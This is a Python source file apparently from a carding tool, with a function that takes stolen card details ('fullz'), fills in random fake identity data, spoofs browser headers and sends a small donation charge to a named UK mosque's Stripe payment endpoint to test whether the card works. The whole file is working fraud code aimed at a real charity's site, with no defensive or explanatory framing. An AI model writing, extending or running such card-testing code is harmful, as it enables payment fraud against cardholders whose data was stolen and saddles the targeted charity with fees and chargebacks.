import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *



def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data          = await get_random_info(session)
        fname                = random_data["fname"]
        lname                = random_data["lname"]
        email                = random_data["email"]
        phone                = random_data["phone"]
        add1                 = random_data["add1"]
        city                 = random_data["city"]
        state                = random_data["state"]
        state_short          = random_data["state_short"]
        zip_code             = random_data["zip"]
        user_agent           = UserAgent().random



        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://makkimasjid.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://makkimasjid.org.uk/donate/building-pro',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        json_data = {
            'card_holder_email': f'{email}',
            'donationType': 'onetime',
            'card_holder_name': 'Crish Niki',
            'card_number': cc,
            'card_expiry_month': f'{mes}',
            'card_expiry_year': ano,
            'card_security_code': f'{cvv}',
            'amount': 3,
            'donationCurrency': 'GBP',
            'donationSadaqah': 'General',
            'gift_aid': {
                'name_prefix': '',
                'firstname': '',
                'lastname': '',
                'address': '',
                'city': '',
                'country': '',
                'postalcode': '',
            },
            'userId': '',
            'is_gift_aid': False,
            'cover_fee': True,
            'domespace_tip': 0.69,
            'domespace_fee': 0,
            'donation_model': 'donation',
            'donationId': 15,
            'stripe_fee': '0.26',
            'isGuest': 1,
            'total': '3.95',
        }

        response = requests.post('https://makkimasjid.org.uk/api/stripePaymentProcess', headers=headers, json=json_data)



        print(response.text)
        





        
        return response

    except Exception as e:
        return str(e)